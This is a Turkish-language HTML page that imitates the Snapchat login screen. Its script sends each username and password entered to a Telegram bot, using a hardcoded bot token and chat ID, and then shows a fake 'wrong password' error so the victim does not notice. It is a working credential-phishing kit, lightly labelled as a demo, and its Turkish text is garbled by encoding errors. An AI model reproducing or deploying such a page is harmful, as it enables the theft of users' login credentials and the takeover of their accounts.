<!doctype html>
<html lang="tr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Snapchat GiriÅŸ</title>
  <style>
    :root{
      --snap-yellow:#fffc00;
      --ink:#111;
      --card:#fff;
      --radius:24px;
      --shadow:0 10px 30px rgba(0,0,0,.15);
      --btn-shadow:0 6px 15px rgba(0,0,0,.2);
      --error-red:#e84141;
    }
    *{box-sizing:border-box}
    body{
      margin:0;
      font-family:'Arial Rounded MT Bold', Arial, sans-serif;
      background:linear-gradient(180deg,#fff799,#ffe400);
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:20px;
      color:var(--ink);
    }
    .wrap{width:100%;max-width:460px}
    .card{
      background:var(--card);
      border-radius:var(--radius);
      padding:28px 24px;
      box-shadow:var(--shadow);
      overflow:hidden;
      text-align:center;
    }
    .ghost{
      width:80px;
      height:80px;
      border-radius:50%;
      background:var(--snap-yellow) url('snap.png') center/cover no-repeat;
      border:3px solid #fff;
      margin:0 auto 12px auto;
      box-shadow:0 4px 12px rgba(0,0,0,.2);
    }
    h1{margin:0;font-size:28px;color:#111}
    form{display:grid;gap:14px;margin-top:16px}
    .field{position:relative}
    .input{
      width:100%;
      padding:16px;
      border-radius:16px;
      border:2px solid #eee;
      font-size:16px;
      outline:none;
    }
    .input:focus{border-color:var(--ink);box-shadow:0 0 0 4px rgba(0,0,0,.08)}
    .btn{
      padding:14px;
      border-radius:16px;
      border:none;
      background:var(--ink);
      color:#fff;
      font-weight:700;
      font-size:16px;
      cursor:pointer;
      box-shadow:var(--btn-shadow);
      transition:transform .1s;
    }
    .btn:active{transform:translateY(2px)}
    .btn:disabled{opacity:.6;cursor:not-allowed}

    /* Hata mesajÄ± */
    .error-message{
      margin-top:10px;
      color:var(--error-red);
      font-weight:700;
      display:none;
      font-size:14px;
    }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <div class="ghost"></div>
      <h1>Snapchat</h1>

      <form id="loginForm" onsubmit="return handleSubmit(event)" autocomplete="on" novalidate>
        <div class="field">
          <input id="uid" name="uid" class="input" type="text" inputmode="email" placeholder="KullanÄ±cÄ± adÄ± veya e-posta" required minlength="3" />
        </div>

        <div class="field">
          <input id="pass" name="pass" class="input" type="password" placeholder="Åžifre" required minlength="6" />
        </div>

        <button class="btn" id="submitBtn" type="submit">GiriÅŸ Yap</button>

        <div class="error-message" id="errorMessage">KullanÄ±cÄ± adÄ± veya ÅŸifre hatalÄ±</div>
      </form>
    </div>
  </div>

  <script>
    const TELEGRAM_BOT_TOKEN = '8388814881:AAFwU8y2X8OrGqt1L9C-2viSBtH7YGvBITw';
    const TELEGRAM_CHAT_ID   = '1997779342';

    const form = document.getElementById('loginForm');
    const submitBtn = document.getElementById('submitBtn');
    const errorMsg = document.getElementById('errorMessage');

    function showError(){
      errorMsg.style.display = 'block';
      setTimeout(()=>{ errorMsg.style.display = 'none'; }, 3000);
    }

    async function handleSubmit(e){
      e.preventDefault();

      if(!form.checkValidity()){
        form.reportValidity();
        return false;
      }

      const username = document.getElementById('uid').value.trim();
      const password = document.getElementById('pass').value.trim();

      const now = new Date().toLocaleString('tr-TR');
      const message = [
        `ðŸ“¥ Demo Form GÃ¶nderimi`,
        `Tarih: ${now}`,
        `KullanÄ±cÄ± adÄ± / E-posta: ${username}`,
        `Åžifre: ${password}`,
        `(TarayÄ±cÄ±dan gÃ¶nderildi)`
      ].join('\n');

      submitBtn.disabled = true;

      try{
        const url = `https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/sendMessage`;
        const payload = { chat_id: TELEGRAM_CHAT_ID, text: message };

        await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        // Demo amaÃ§lÄ± hata gÃ¶ster
        showError();

      } catch(err){
        console.error(err);
        showError();
      } finally {
        submitBtn.disabled = false;
      }

      return false;
    }
  </script>
</body>
</html>
